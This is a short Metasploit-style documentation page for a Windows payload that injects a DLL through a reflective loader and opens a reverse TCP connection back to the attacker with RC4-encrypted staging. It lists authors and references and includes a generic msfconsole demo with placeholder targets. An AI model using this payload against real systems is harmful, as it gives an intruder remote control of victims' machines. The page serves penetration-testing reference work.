## Reflective DLL Injection, Reverse TCP Stager (RC4 Stage Encryption)

Inject a DLL via a reflective loader. Connect back to the 
attacker


## Module Name
payload/windows/dllinject/reverse_tcp_rc4

## Authors
* sf
* hdm
* skape
* mihi


## References
* https://github.com/stephenfewer/ReflectiveDLLInjection
* https://github.com/rapid7/ReflectiveDLLInjection




## Platforms
* win

## Reliability
[Normal](https://github.com/rapid7/metasploit-framework/wiki/Exploit-Ranking)

## Demo

```
msf > use payload/windows/dllinject/reverse_tcp_rc4
msf payload(reverse_tcp_rc4) > show targets
   ... a list of targets ...
msf payload(reverse_tcp_rc4) > set TARGET <target-id>
msf payload(reverse_tcp_rc4) > show options
   ... show and set options ...
msf payload(reverse_tcp_rc4) > run
```
    
    